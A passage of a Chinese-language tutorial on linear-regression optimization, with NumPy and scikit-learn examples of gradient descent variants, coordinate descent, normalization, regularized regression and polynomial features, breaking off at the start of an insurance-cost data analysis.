9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import numpy as np np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 超参数 learning_rate = 0.0001 # 学习率 α n_iterations = 1000 # 迭代次数 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # 初始化参数向量 w_init = np.random.randn(n+1,1) # 求梯度 for n_iteration in range(n_iterations): gradient = X.T.dot(X.dot(w_init)-y) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # 预测 y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02631227 3.98414324 4.00461388 4.97843832 1.02499615]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.23804251] [68.23011847] [75.97363505]] 2、随机梯度下降（SGD） $$ \\displaystyle {\\nabla_{\\theta}J(\\theta) = \\frac{\\partial}{\\partial\\theta}J(\\theta) = (h_\\theta(x^{(i)})-y^{(i)})x^{(i)} = ({x^{(i)}})^T(x^{(i)}\\theta-y^{(i)}) , i \\sim \\text{Uniform}\\bigl(\\{1,2,\\dots,m\\}\\bigr)} $$ (1)、代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import numpy as np np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 超参数 learning_rate = 0.0001 # 学习率 α n_iterations = 1000 # 迭代次数 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # 初始化参数向量 w_init = np.random.randn(n+1,1) # 求梯度 for n_iteration in range(n_iterations): for _ in range(m): random_index = np.random.randint(m) x_i = X[random_index:random_index+1,:] y_i = y[random_index:random_index+1,:] gradient = x_i.T.dot(x_i.dot(w_init)-y_i) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # 预测 y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.01922912 3.97831998 4.00264292 4.96386168 1.01662312]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.1024122 ] [68.08959999] [75.78462184]] (2)、小幅优化：打乱数据索引，顺序选取向量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 import numpy as np np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 超参数 learning_rate = 0.0001 # 学习率 α n_iterations = 1000 # 迭代次数 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # 初始化参数向量 w_init = np.random.randn(n+1,1) # 求梯度 for n_iteration in range(n_iterations): # 打乱顺序，顺序读取 index = np.arange(m) np.random.shuffle(index) X = X[index] y = y[index] for i in range(m): x_i = X[i:i+1,:] y_i = y[i:i+1,:] gradient = x_i.T.dot(x_i.dot(w_init)-y_i) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # 预测 y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02675441 3.98450041 4.00505391 4.9789357 1.02541193]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.24520848] [68.23968977] [75.98378179]] 3、小批量梯度下降（Mini-batch SGD） $$ \\displaystyle{\\nabla_{\\theta}J(\\theta) = \\frac{\\partial}{\\partial{\\theta}}J(\\theta) = \\displaystyle \\sum_{i\\in S}(h_\\theta(x^{(i)}) - y^{(i)})x^{(i)} = ({x^{(S)}})^T(x^{(S)}\\theta-y^{(S)}) , |S|=\\text{batch\\_size} \u003c m,\\; S\\subseteq \\{1,2,\\dots ,m\\},\\; S\\text{均匀随机选取}} $$ (1)、代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 import numpy as np np.random.seed(20030428) x_pre = np.random.random(size = (3,n))*10 # 维度 n = 4 # 数据量 m = 1000 # 分批大小 batch_size = 10 # 批次数 num_batches = int(m/batch_size) # 超参数 learning_rate = 0.0001 # 学习率 α n_iterations = 1000 # 迭代次数 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # 初始化参数向量 w_init = np.random.randn(n+1,1) # 求梯度 for n_iteration in range(n_iterations): for _ in range(num_batches): random_index = np.random.randint(m) x_s = X[random_index:random_index+batch_size,:] y_s = y[random_index:random_index+batch_size,:] gradient = x_s.T.dot(x_s.dot(w_init)-y_s) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # 预测 y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.04016211 3.9927612 4.01168955 4.96684374 1.00728303]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.14498768] [68.13517282] [75.83694482]] (2)、小幅优化：打乱数据索引，顺序批量选取向量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 import numpy as np np.random.seed(20030428) x_pre = np.random.random(size = (3,n))*10 # 维度 n = 4 # 数据量 m = 1000 # 分批大小 batch_size = 10 # 批次数 num_batches = int(m/batch_size) # 超参数 learning_rate = 0.0001 # 学习率 α n_iterations = 1000 # 迭代次数 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # 初始化参数向量 w_init = np.random.randn(n+1,1) # 求梯度 for n_iteration in range(n_iterations): # 打乱顺序，顺序读取 index = np.arange(m) np.random.shuffle(index) X = X[index] y = y[index] for i in range(num_batches): x_s = X[i*batch_size:i*batch_size+batch_size,:] y_s = y[i*batch_size:i*batch_size+batch_size,:] gradient = x_s.T.dot(x_s.dot(w_init)-y_s) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # 预测 y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.0267601 3.98450244 4.00504673 4.978934 1.02541437]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.24518034] [68.23964038] [75.98376306]] 4、SGD的sklearn库实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import numpy as np from sklearn.linear_model import SGDRegressor np.random.seed(20030428) x_pre = np.random.random(size = (3,n))*10 # 维度 n = 4 # 数据量 m = 1000 # 超参数 learning_rate = 0.001 # 学习率 α n_iterations = 10000 # 迭代轮次 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) sgd_reg = SGDRegressor( loss=\u0026#39;squared_error\u0026#39;, # MSE penalty = None, # 无正则项 alpha = 0, # 无正则强度 learning_rate = \u0026#39;constant\u0026#39;, # 学习率 eta0 = learning_rate, # 固定学习率 fit_intercept = True, # 增加偏置列 max_iter = n_iterations * m, # 迭代次数 warm_start = False, # 不进行手动迭代，直接迭代完成 random_state = 20030428, # 打乱样本的随机种子 ) sgd_reg.fit(x,y.flatten()) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[sgd_reg.intercept_,sgd_reg.coef_.reshape(1,-1)]) # 预测 y_pre = sgd_reg.predict(x_pre).reshape(-1,1) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[4.78413833 4.04362443 4.06423645 5.03733553 1.08352435]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.86766804] [69.21400854] [77.04212681]] 5、梯度下降法的问题与解决思路 学习速率调整（学习速率调度，Learning rate schedules）：该方法试图在每次更新参数的过程中，改变学习速率。一般使用某种事先设定的策略或者在每次迭代中衰减一个较小的阈值 在稀疏特征数据中：很少出现的特征应该使用一个相对较大的学习速率 对于非凸目标函数：可能落入鞍点或平滑点 （1）、确定速率调整函数 1 2 3 4 5 6 7 8 9 10 import numpy as np import matplotlib.pyplot as plt t0,t1 = 5,50000 def learning_rate_schedule(alpha): return t0/(alpha * 1000 + t1) x_show = np.linspace(1,1000,1000) y_show = np.array([learning_rate_schedule(x_show[i]) for i in range(len(x_show))]) plt.plot(x_show,y_show) [\u0026lt;matplotlib.lines.Line2D at 0x1a768afe390\u0026gt;] （2）、更改学习速率 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import numpy as np np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 超参数 # learning_rate = 0.0001 # 学习率 α n_iterations = 1000 # 迭代次数 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # 初始化参数向量 w_init = np.random.randn(n+1,1) # 求梯度 for n_iteration in range(n_iterations): gradient = X.T.dot(X.dot(w_init)-y) w_init = w_init - learning_rate_schedule(n_iteration)*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # 预测 y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[4.97242598 3.99644548 4.01333635 4.98719143 1.04554164]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.36296538] [68.4494602 ] [76.21792798]] 三、坐标下降（Coordinate Descent） 坐标下降：一次走一步，每次只动一个变量。将高维问题拆成一系列一维问题，逐个坐标迭代更新，直到收敛 核心思想：固定其他所有变量，只沿第i个坐标方向做一维最优化，循环往复 迭代公式：$\\displaystyle{\\theta_i^{(k+1)} = \\arg\\min_{\\theta_i}Loss(\\theta_1^{(k+1)}, \\dots, \\theta_{i-1}^{(k+1)}, \\theta_i, \\theta_{i+1}^{(k)}, \\dots, \\theta_n^{(k)})}$，其中 $Loss$ 为目标损失函数，$\\theta^{(k)}$ 为第 $k$ 次迭代时的完整参数向量，$\\theta^{(k)}_i$ 为第 $k$ 次迭代时向量 $\\theta$ 的第 $i$ 个分量 对于MES的参数迭代公式（由MSE推导而来）： $$ \\displaystyle{\\theta_j = \\frac{\\displaystyle{ \\sum^m_{i=1}x^{(i)}_j(y^{(i)}-\\sum_{k\\neq j}\\theta_kx^{(i)}_k)}}{\\displaystyle{\\sum^m_{i=1}(x_j^{(i)})^2}}}\\Rightarrow \\theta^{(k+1)}_j = \\theta^{(k)}_j - \\displaystyle{\\frac{1}{X_{·j}^TX_{·j}}X_{·j}^T(X\\theta-y)} $$，其中 $m$ 为样本数量，$\\theta_j$ 为 $\\theta$ 的第 $j$ 个分量，$x^{(i)}_j$ 为第 $i$ 条样本的第 $j$ 个分量 代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import numpy as np np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 超参数 n_iterations = 1000 # 迭代次数 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # 初始化参数向量 theta = np.zeros(shape=(n+1,1)) for _ in range(n_iterations): for j in range(theta.shape[0]): theta[j] = theta[j] - (1/(X[:,j]@X[:,j]))*X[:,j]@(X@theta - y) print(\u0026#39;W_hat:\u0026#39;) print(theta) # 预测 y_pre = np.c_[np.ones((3,1)),x_pre].dot(theta) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02671056] [3.98404888] [4.00452019] [4.9783491 ] [1.02490084]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.23707594] [68.2285754 ] [75.97196488]] 四、归一化（Normalization） 归一化是将不同尺度、纲量和分布的数据缩放到同一标准区间的预处理技术 核心目的：消除纲量影响、加速模型收敛、提升数值稳定性，同时保留原始信息的相对关系 特征级归一化方法 最大值最小值归一化（Min-Max）：受离心值影响较大 对第j个特征值做归一化：$$\\displaystyle{x^{*}_{i,j} = \\frac{x_{i,j}-x_j^{\\text{min}}}{x_j^{\\text{max}}-x_j^{\\text{min}}}}$$ 对整个数据集做归一化：$\\displaystyle{x^* = \\frac{x-min(x)}{max(x)-min(x)}}$ 标准归一化（Z-score）： 对第j个特征值做归一化： $$ \\displaystyle{x^*_{i,j} = \\frac{x_{i,j} - \\mu_j}{\\sigma_j}} $$ ，其中 $$ \\displaystyle{\\mu_j=\\frac{1}{n}\\sum_{i=1}^n x_{i,j},\\quad \\sigma_j=\\sqrt{\\frac{1}{n} \\sum_{i=1}^n (x_{i,j}-\\mu_j)^2}} $$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import numpy as np from sklearn.preprocessing import MinMaxScaler from sklearn.preprocessing import StandardScaler np.random.seed(20030428) # 数据维度 n = 4 # 数据规模 m = 100 # 初始化数据 x = np.empty((m, 2)) x[:, 0] = np.random.normal(1, 2, m) x[:, 1] = np.random.random(m) * 10-3 plt.scatter(x[:,0],x[:,1],label=\u0026#39;original\u0026#39;) # Min-Max归一化 minmax_scaler = MinMaxScaler() x_min_max_normalization = minmax_scaler.fit_transform(x) plt.scatter(x_min_max_normalization[:,0],x_min_max_normalization[:,1],label=\u0026#39;min-max\u0026#39;) minmax_scaler.fit(x) # Z-score归一化 standar_scaler = StandardScaler() x_standar_scaler = standar_scaler.fit_transform(x) plt.scatter(x_standar_scaler[:,0],x_standar_scaler[:,1],label=\u0026#39;z-score\u0026#39;) standar_scaler.fit(x) print(\u0026#39;μ =\u0026#39;, standar_scaler.mean_) print(\u0026#39;σ² =\u0026#39;, standar_scaler.var_) plt.legend() plt.show() μ = [1.07725633 2.44897092] σ² = [3.86482916 7.93336293] 五、正则化（Regularization） 过拟合与欠拟合 欠拟合（underfit）：未拟合到位，训练集和测试集准确率未达到最高 过拟合（overfit）：拟合过度，训练集准确率升高的同时，测试集的准确率反而降低 适度拟合（just right）：过拟合前，训练集和测试集准确率都达到最高时刻 正则化：防止过拟合，增加模型鲁棒性（Robust） 鲁棒性调优：使模型具有更好的鲁棒性，让模型的的泛化能力和推广能力更加强大 正则化本质：牺牲模型在训练集上的正确率以提高模型的推广能力，参数 w 在数值上越小越好，进而抵抗数值扰动。但 w 的数值不能极小，故而将原来的损失函数加上一个惩罚项 惩罚项（正则项）： L1 正则项： $$ \\displaystyle{L_1(w) = \\sum^m_{i=0}|w_i|} $$（曼哈顿距离）， $$ \\displaystyle{\\frac{\\partial}{\\partial w_i}L_1(w_i) = sign(w_i) = \\pm 1} $$ L2 正则项： $$ \\displaystyle{L_2(w) = \\sum^m_{i=0}|w_i|^2} $$（欧式距离的平方）， $$ \\displaystyle{\\frac{\\partial}{\\partial w_i}L_2(w_i) = 2w_i} $$ 正则化后的多元线性回归的损失函数 Lasso 回归（套索回归，稀疏性）： 损失函数 $$ J_{lasso}(\\theta)=MSE(\\theta)+L_1(\\theta) $$ 梯度 $$ \\displaystyle{\\nabla_{\\theta}J_{Lasso}(\\theta)=\\frac{\\partial}{\\partial \\theta}J(\\theta)+\\frac{\\partial}{\\partial \\theta}L_1(\\theta)=X^T(X\\theta-y)+\\lambda sign(\\theta)} $$ Ridge 回归（岭回归，平滑性）： 损失函数 $$ J_{ridge}(\\theta)=MSE(\\theta)+L_2(\\theta) $$ 梯度 $$ \\displaystyle{\\nabla_{\\theta}J_{Ridge}(\\theta)=\\frac{\\partial}{\\partial \\theta}J(\\theta)+\\frac{\\partial}{\\partial \\theta}L_2(\\theta)=X^T(X\\theta-y)+2\\lambda \\theta} $$ ElasticNet回归（弹性网络回归）： 损失函数 $$ J_{lasso}(\\theta)=MSE(\\theta)+L_1(\\theta)+L_2(\\theta) $$ 梯度 $$\\displaystyle{\\nabla_{\\theta}J_{Lasso}(\\theta)=\\frac{\\partial}{\\partial \\theta}J(\\theta)+\\frac{\\partial}{\\partial \\theta}L_1(\\theta)+\\frac{\\partial}{\\partial \\theta}L_2(\\theta)=X^T(X\\theta-y)+\\lambda[(1-r)sign(\\theta)+2r\\theta)]} $$ 注：Lasso 回归与 Ridge 回归只定义了 Loss 函数模型，可以用梯度下降法、坐标下降法、最小角回归（LARS）、正规方程等方法进行求解。在 sklearn 库中 Lasso 和 ElasticNet 使用坐标下降；Ridge 使用正规方程；SVGRegressor 使用随机梯度下降，可自定义正则化类型、正则化强度、学习率、阈值、迭代次数等等 1、Lasso回归（sklearn库） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import numpy as np from sklearn.linear_model import Lasso np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) lasso_reg = Lasso(alpha=0.0015,max_iter=30000000) lasso_reg.fit(x,y) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[lasso_reg.intercept_,lasso_reg.coef_.reshape(1,-1)]) # 预测 y_pre = lasso_reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre.reshape(-1,1)) 1 2 3 4 5 6 7 8 9 10 W_hat: [[5.0464025 3.97908982 3.99958499 4.97364032 1.01995191]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.18512159] [68.14652889] [75.88324745]] 2、Ridge回归（sklearn库） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import numpy as np from sklearn.linear_model import Ridge np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) ridge_reg = Ridge(alpha=0.4,solver=\u0026#39;sag\u0026#39;) ridge_reg.fit(x,y) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[ridge_reg.intercept_,ridge_reg.coef_.reshape(1,-1)]) # 预测 y_pre = ridge_reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre.reshape(-1,1)) W_hat: [[5.04469365 3.97896047 3.99922338 4.97248436 1.02326193]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.18895127] [68.16319935] [75.89870099]] 3、ElasticNet回归（sklearn库） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import numpy as np from sklearn.linear_model import ElasticNet np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) elasticnet_reg = ElasticNet(alpha=0.01,l1_ratio=0.2) elasticnet_reg.fit(x,y) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[elasticnet_reg.intercept_,elasticnet_reg.coef_.reshape(1,-1)]) # 预测 y_pre = elasticnet_reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre.reshape(-1,1)) W_hat: [[5.40784751 3.87770911 3.89554975 4.85588961 0.98362001]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[56.21597338] [66.82977581] [74.39992651]] 4、随机梯度下降实现elasticnet正则化（sklearn库） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import numpy as np from sklearn.linear_model import SGDRegressor np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) sgd_reg = SGDRegressor( penalty=\u0026#39;elasticnet\u0026#39;, # 正则化类型 max_iter = 100000, # 迭代次数 alpha = 0.01, # 正则化强度 λ l1_ratio=0.2, # l1正则化比例 tol = 1e-10, # 收敛阈值 # …… ) sgd_reg.fit(x,y.ravel()) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[sgd_reg.intercept_,sgd_reg.coef_.reshape(1,-1)]) # 预测 y_pre = sgd_reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre.reshape(-1,1)) W_hat: [[5.1320958 3.93664843 3.95394899 4.913876 1.04281603]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[56.80371943] [67.77050846] [75.42653888]] 六、升维方法 — 多项式回归（Polynomial Regression） 目的：解决欠拟合问题 常见手段：将已知维度进行相乘来构建新的维度，将非线性Data转换为线性Data 以二阶多项式升维为例： $$ y=w_0+w_1x_1+w_2x_2\\Rightarrow y^*=w_0+w_1x_1+w_2x_2+w_3x_1^2+w_4x_2^2+w_5x_1x_2 $$ 以下面拟合过程为例：$D_3$ 达到最佳拟合。随着维度的增加，$D_3$ 以下训练集和测试集误差均减小，属于欠拟合；$D_3$ 以上训练集误差减小，测试集误差增大，属于过拟合 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 import numpy as np import matplotlib.pyplot as plt from sklearn.preprocessing import PolynomialFeatures from sklearn.linear_model import LinearRegression from sklearn.metrics import mean_squared_error np.random.seed(20030428) plt.xlim(-21, 51) # 横轴 plt.ylim(-8000, 4000) # 纵轴 # 预设函数 def mapping(x): return 0.2*x**3 - 10*x**2 + 5*x - 1 # 维度 n = 1 x_show = np.linspace(-20,50,10000) plt.plot(x_show,mapping(x_show),color=\u0026#39;C0\u0026#39;,label=\u0026#39;scheduled model\u0026#39;) # 训练集数据量 train_size= 10000 # 测试集数据量 test_size = 10000 # 随机生成训练集 x_train = np.random.rand(m,n) * 60 - 20 y_train = mapping(x_train) + np.random.randn(m,1)*1111 plt.scatter(x_train,y_train,color=\u0026#39;C1\u0026#39;,s=5,label=\u0026#39;train set data\u0026#39;) # 随机生成测试集 x_test = np.random.rand(m,n) * 400 - 100 y_test = mapping(x_test) + np.random.randn(m,1)*1111 plt.scatter(x_test,y_test,color=\u0026#39;C2\u0026#39;,s=5,label=\u0026#39;train set data\u0026#39;) ### 升维预测 ### # dimensions = {2:\u0026#39;C3\u0026#39;} dimensions = {1:\u0026#39;C8\u0026#39;,2:\u0026#39;C3\u0026#39;,3:\u0026#39;C4\u0026#39;,4:\u0026#39;C5\u0026#39;,5:\u0026#39;C9\u0026#39;,6:\u0026#39;C7\u0026#39;,7:\u0026#39;C6\u0026#39;,8:\u0026#39;C10\u0026#39;} for dim,color in dimensions.items(): # 多项式升维 poly_features = PolynomialFeatures( degree=dim, # 设置维度 include_bias=True # 设置截距 ) # 训练集和测试集升维 x_train_poly = poly_features.fit_transform(x_train) x_test_poly = poly_features.fit_transform(x_test) # 线性回归 lin_reg = LinearRegression( fit_intercept=False # 不加偏置 ) lin_reg.fit(x_train_poly,y_train) y_train_pre = lin_reg.predict(x_train_poly) y_test_pre = lin_reg.predict(x_test_poly) train_norm = mean_squared_error(y_train,y_train_pre) test_norm = mean_squared_error(y_test,y_test_pre) lab = f\u0026#34;D:{dim}/Train:{train_norm/1e6:.5f}/Test:{test_norm/1e6:.5f}\u0026#34; x_show_poly = poly_features.fit_transform(x_show.reshape(-1,1)) plt.plot(x_show,lin_reg.predict(x_show_poly),color=dimensions[dim],label=lab) plt.legend( loc=\u0026#39;upper left\u0026#39;, # 以legend左上角为基准点 bbox_to_anchor=(1.02, 1), # 距离原点的相对位置，图像为0-1 borderaxespad=0, # 间距值 ncol=1, # 分几列 ) \u0026lt;matplotlib.legend.Legend at 0x1a768d8d150\u0026gt; 七、实践 — 保险花销预测 数据集路径： \u0026ldquo;.\\Dataset\\1_Insurance_Expense_Forecast\\insurance.csv\u0026rdquo; 1、数据提取 1 2 3 4 5 6 7 import pandas as pd import numpy as np data = pd.read_csv( \u0026#39;./Dataset/1_Insurance_Expense_Forecast/insurance.csv\u0026#39;, sep=\u0026#39;,\u0026#39;) data.head(6) age sex bmi children smoker region charges 0 19 female 27.900 0 yes southwest 16884.92400 1 18 male 33.770 1 no southeast 1725.55230 2 28 male 33.000 3 no southeast 4449.46200 3 33 male 22.705 0 no northwest 21984.47061 4 32 male 28.880 0 no northwest 3866.85520 5 31 female 25.740 0 no southeast 3756.62160 2、EDA（Exploratory Data Analysis，探索性数据分析） 本质：在把数据喂给算法之前，先用人眼和统计工具观察和清洗数据 